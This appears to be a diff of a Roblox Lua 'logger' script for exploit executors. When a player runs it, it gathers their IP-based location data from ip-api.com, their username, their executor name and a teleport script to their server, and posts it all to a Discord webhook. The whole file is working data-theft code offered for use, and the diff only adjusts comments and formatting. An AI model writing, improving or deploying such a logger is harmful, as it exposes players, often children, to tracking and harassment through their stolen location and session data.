@@ -1,9 +1,7 @@
-
---creates the join script
 local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
-print(helo)
+print(helo) --line above generates a script that allows u to join the logged user
 
---checks what exacutor ur using
+--checks exacutor
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
@@ -11,30 +9,31 @@ local webhookcheck =
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"
 
---webhook here ofc
 local url =
-   "Your webhook here"
+   "webhook goes here" --pretty obvious what to do here
 local data = {
-   ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL", --text outside of the box
-   ["embeds"] = {
+            ["username"] = "Salmon-L0G", --webhook name thing idk
+            ["avatar_url"] = "https://cdn.upload.systems/uploads/haO2MM1R.png", --avatar image url
+    
+    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** EXACUTED UR LOGGER LOL", --normal message
+    ["embeds"] = {
        {
            ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just got logged!!!**",
            ["description"] = "**"..game:HttpGet("http://ip-api.com/line/?fields=61439").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
+           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
+           ["color"] = 14680319,
            ["footer"] = {
-             ["text"] = "" ..join_script.. "" --posts the join script created by the first function
-           }
-       }
+             ["text"] = "" ..join_script.. "", --sends join script
+           },
+       },
    }
 }
- 
- 
+
 local newdata = game:GetService("HttpService"):JSONEncode(data)
- 
+
 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
+request(abcdef) --post, idk
